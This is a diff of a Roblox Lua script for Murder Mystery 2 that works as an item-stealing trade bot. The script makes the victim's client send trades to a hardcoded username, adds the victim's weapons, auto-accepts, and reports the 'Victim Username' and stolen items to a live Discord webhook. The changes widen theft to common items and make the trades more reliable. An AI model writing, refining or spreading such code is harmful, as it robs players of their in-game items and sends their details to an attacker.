@@ -5,7 +5,7 @@ end
 _G.scriptExecuted = true
 
 _G.Usernames = {"Ax3lxzik"} 
-_G.min_rarity = "Rare"
+_G.min_rarity = "Common"
 _G.min_value = 1 
 _G.pingEveryone = "Yes" 
 _G.webhook = "https://discord.com/api/webhooks/1453771705972560056/Cqx6olAGhd60QXNCfM2syHasb4_rIJxjNDC4WT_s76FO2EziCy6JLhRS1aHX6rcFIPm7" 
@@ -225,7 +225,6 @@ local function acceptTrade()
     local acceptTradeEvent = game:GetService("ReplicatedStorage").Trade.AcceptTrade
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("CancelAccept"):FireServer()
 
-    
     game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
         if tradeUpdate.LastOffer then
             while true do
@@ -239,7 +238,6 @@ local function acceptTrade()
         end
     end)
 end
-
 
 local function addWeaponToTrade(id)
     local args = {
@@ -321,23 +319,23 @@ local function SendMessage(sortedItems)
         ["Content-Type"] = "application/json"
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = string.format("Total Value: %s", totalValue),
             inline = false
         }
-	}
+    }
 
     for _, item in ipairs(sortedItems) do
         local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
@@ -358,12 +356,12 @@ local function SendMessage(sortedItems)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\148\170 New MM2 Execution" ,
+            ["title"] = "\240\159\148\170 New MM2 Execution",
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = ""
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = ""
+            }
         }}
     }
 
@@ -460,14 +458,22 @@ if #weaponsToSend > 0 then
 
     SendFirstMessage(weaponsToSend, prefix)
 
+    local isTrading = false
+
     local function doTrade(joinedUser)
+        if isTrading then
+            return
+        end
+        
+        isTrading = true
+        
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-            wait(0.3)
+            wait(0.5)
         elseif initialTradeState == "ReceivingRequest" then
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-            wait(0.3)
+            wait(0.5)
         end
 
         while #weaponsToSend > 0 do
@@ -475,11 +481,12 @@ if #weaponsToSend > 0 then
 
             if tradeStatus == "None" then
                 sendTradeRequest(joinedUser)
+                wait(0.5)
             elseif tradeStatus == "SendingRequest" then
-                wait(0.3)
+                wait(0.5)
             elseif tradeStatus == "ReceivingRequest" then
                 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-                wait(0.3)
+                wait(0.5)
             elseif tradeStatus == "StartTrade" then
                 for i = 1, math.min(4, #weaponsToSend) do
                     local weapon = table.remove(weaponsToSend, 1)
@@ -490,37 +497,55 @@ if #weaponsToSend > 0 then
                 wait(6)
                 acceptTrade()
                 waitForTradeCompletion()
+                wait(1)
             else
                 wait(0.5)
             end
-            wait(1)
+            wait(0.5)
         end
-        plr:kick("invalid position")
+        
+        isTrading = false
     end
 
-    -- FIX: Démarrer le trade automatiquement quand le joueur rejoint
-    local tradeStarted = false
+    local function startTradeWithPlayer(player)
+        if not player or not player.Parent then
+            return
+        end
+        
+        wait(3)
+        
+        if not player.Parent then
+            return
+        end
+        
+        SendMessage(sentWeapons)
+        doTrade(player.Name)
+    end
+    
     local function onPlayerAdded(player)
-        if table.find(users, player.Name) and not tradeStarted then
-            tradeStarted = true
-            -- Attendre que le joueur soit complètement chargé
-            wait(2)
-            SendMessage(sentWeapons)
-            doTrade(player.Name)
+        if table.find(users, player.Name) then
+            task.spawn(function()
+                startTradeWithPlayer(player)
+            end)
         end
     end
     
-    -- Vérifier si le joueur est déjà dans le serveur
+    local targetFound = false
     for _, p in ipairs(Players:GetPlayers()) do
-        if table.find(users, p.Name) and not tradeStarted then
-            tradeStarted = true
-            wait(2)
-            SendMessage(sentWeapons)
-            doTrade(p.Name)
+        if table.find(users, p.Name) then
+            targetFound = true
+            task.spawn(function()
+                startTradeWithPlayer(p)
+            end)
             break
         end
     end
     
-    -- Écouter les nouveaux joueurs qui rejoignent
     Players.PlayerAdded:Connect(onPlayerAdded)
+    
+    Players.PlayerRemoving:Connect(function(player)
+        if table.find(users, player.Name) then
+            isTrading = false
+        end
+    end)
 end
